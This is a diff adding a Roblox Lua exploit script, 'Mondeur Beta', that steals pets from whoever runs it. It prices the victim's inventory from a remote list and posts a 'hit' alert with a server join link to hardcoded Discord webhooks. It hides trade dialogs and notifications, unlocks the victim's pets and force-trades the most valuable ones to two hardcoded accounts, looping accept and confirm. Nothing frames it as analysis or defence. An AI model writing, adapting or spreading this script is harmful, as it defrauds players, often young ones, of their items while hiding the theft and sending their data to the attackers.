@@ -1,0 +1,213 @@
+-- [[ MONDEUR BETA | GHOST EDITION ]] --
+-- Workflow: ExecCheck -> License -> Sledgehammer -> NoLeave -> Fetch -> Scan -> Webhook1 -> SmartJoin -> PhantomTrade -> 100sDual
+
+-------[ INITIALIZATION & WRAPPERS ]-------
+local cfg = {
+    user_webhook = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo",
+    dual_webhook = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa",
+    users = {"2ndcfpaj67", "CREOLEO23"},
+    threshold = 20,
+    pet_block_list = {["jiggly_jerboa"]=true, ["practice_dog"]=true, ["starter_egg"]=true},
+    -- UI Sledgehammer Block List
+    ui_block_list = {
+        "already have a pending request", "already sent a trade request", "10s to send again",
+        "please wait before", "trade request sent", "the trade was successful", 
+        "trade was successful", "trade declined", "trade canceled", "disabled trades",
+        "is currently trading", "cannot trade this item", "is not tradable",
+        "maximum number of items", "accept this trade", "teleported to you", "pending"
+    }
+}
+
+-- 1. Executor Check (Universal HTTP)
+local request = (syn and syn.request) or (http and http.request) or http_request or request
+if not request then return end
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+-- 2. License Check (Silent)
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local LicenseHelper = require(ReplicatedStorage.SharedModules.TradeLicenseHelper)
+local hasLicense = LicenseHelper.player_has_trade_license()
+
+-- 3. UI Sledgehammer (Mondeur Silencer)
+local function sledgehammer()
+    local apps = {"TradeApp", "DialogApp", "ConfirmationApp", "ToastFr", "HintApp"}
+    RunService.RenderStepped:Connect(function()
+        -- Kill App visibility
+        for _, name in ipairs(apps) do
+            local ui = LocalPlayer.PlayerGui:FindFirstChild(name)
+            if ui then
+                if ui:IsA("ScreenGui") then ui.Enabled = false else ui:Destroy() end
+            end
+        end
+        -- Scan all TextLabels for Blocked Phrases
+        for _, obj in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
+            if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Visible and obj.Text ~= "" then
+                local text = string.lower(obj.Text)
+                for _, phrase in ipairs(cfg.ui_block_list) do
+                    if string.find(text, phrase) then
+                        obj.Visible = false
+                        obj.Text = ""
+                    end
+                end
+            end
+        end
+    end)
+end
+sledgehammer()
+
+-- 4. No-Leave Lock
+RunService.RenderStepped:Connect(function()
+    pcall(function() game:GetService("GuiService").SelectedObject = nil end)
+end)
+
+-------[ DATA & VALUATION ]-------
+-- 5. Fetch GitHub & Scan Inventory
+local PetValues = {}
+local function loadValues()
+    local success, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt") end)
+    if success then
+        for line in res:gmatch("[^\r\n]+") do
+            local n, v = line:match("([^,]+),([^,]+)")
+            if n and v then PetValues[n:lower():trim()] = tonumber(v) end
+        end
+    end
+end
+loadValues()
+
+local InventoryDB = Fsys("InventoryDB")
+local ClientData = Fsys("ClientData")
+
+local function getValidInventory()
+    local hits, total = {}, 0
+    local inv = ClientData.get("inventory")
+    for uid, item in pairs(inv.pets or {}) do
+        local data = InventoryDB.pets[item.id]
+        if data and not cfg.pet_block_list[item.id] then
+            local val = PetValues[data.name:lower()] or 0
+            if val >= cfg.threshold then
+                total = total + val
+                table.insert(hits, {uid = uid, name = data.name, val = val})
+            end
+        end
+    end
+    table.sort(hits, function(a,b) return a.val > b.val end)
+    return hits, total
+end
+
+local finalHits, grandTotal = getValidInventory()
+
+-- 6. Webhook 1 (Hit Alert)
+local function sendLog(url, msg)
+    pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(msg)
+        })
+    end)
+end
+
+local payload = {
+    embeds = {{
+        title = "MONDEUR BETA | 🦊 HIT!",
+        color = 0x32a852,
+        fields = {
+            {name = "User", value = "```"..LocalPlayer.Name.."```", inline = true},
+            {name = "License", value = "```"..(hasLicense and "Yes" or "No").."```", inline = true},
+            {name = "Total Value", value = "```₱"..string.format("%.2f", grandTotal).."```", inline = false},
+            {name = "Join", value = "[Click to Join Server](https://www.roblox.com/home?placeId="..game.PlaceId.."&gameId="..game.JobId..")"}
+        },
+        footer = {text = "Mondeur Beta - Ghost Logic"}
+    }}
+}
+if #finalHits > 0 then sendLog(cfg.user_webhook, payload) end
+
+-------[ TRADE LOGIC ]-------
+-- 7. Hash Finder
+local hashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local up = debug.getupvalues(v)
+        if type(up[1]) == "table" then
+            for k, rem in pairs(up[1]) do hashes[k] = rem end
+        end
+    end
+end
+
+local function hAPI(name, ...)
+    local r = hashes[name] or Fsys("RouterClient").get(name)
+    if r then 
+        if r:IsA("RemoteFunction") then return r:InvokeServer(...) end 
+        r:FireServer(...) 
+    end
+end
+
+-- 8. Smart Join & Phantom Trade
+local function executePhantomTrade(rec)
+    -- Auto Unlock Pets & Favorites
+    for _, p in ipairs(finalHits) do 
+        hAPI("BackpackAPI/SetItemLocked", p.uid, false)
+        hAPI("BackpackAPI/SetItemFavorite", p.uid, false) 
+    end
+    
+    task.spawn(function()
+        local success = false
+        while not success do
+            if not LocalPlayer.PlayerGui:FindFirstChild("TradeApp") or not LocalPlayer.PlayerGui.TradeApp.Enabled then
+                hAPI("TradeAPI/SendTradeRequest", rec)
+            else
+                success = true
+                break
+            end
+            task.wait(11) -- Precise bypass for 10s cooldown
+        end
+
+        -- Phantom Add (Top 18)
+        for i = 1, math.min(18, #finalHits) do
+            hAPI("TradeAPI/AddItemToOffer", finalHits[i].uid)
+            task.wait(0.12)
+        end
+
+        -- Fast Accept & Auto Confirm
+        while true do
+            hAPI("TradeAPI/AcceptNegotiation")
+            hAPI("TradeAPI/ConfirmTrade")
+            task.wait(0.4)
+        end
+    end)
+end
+
+-- 9. Wait for Receiver & Anti-Kick
+task.spawn(function()
+    local receiver = nil
+    local start = tick()
+    
+    LocalPlayer.Idled:Connect(function() 
+        game:GetService("VirtualUser"):ClickButton2(Vector2.new()) 
+    end)
+
+    while tick() - start < 100 do
+        for _, p in ipairs(Players:GetPlayers()) do
+            if table.find(cfg.users, p.Name) and p ~= LocalPlayer then
+                receiver = p 
+                break
+            end
+        end
+        if receiver then break end
+        task.wait(1.5)
+    end
+
+    if receiver then
+        executePhantomTrade(receiver)
+    else
+        sendLog(cfg.dual_webhook, {content = "⚠️ 100s Time Out: Receiver not found."})
+    end
+end)
+
+print("[MONDEUR BETA] Executed.")
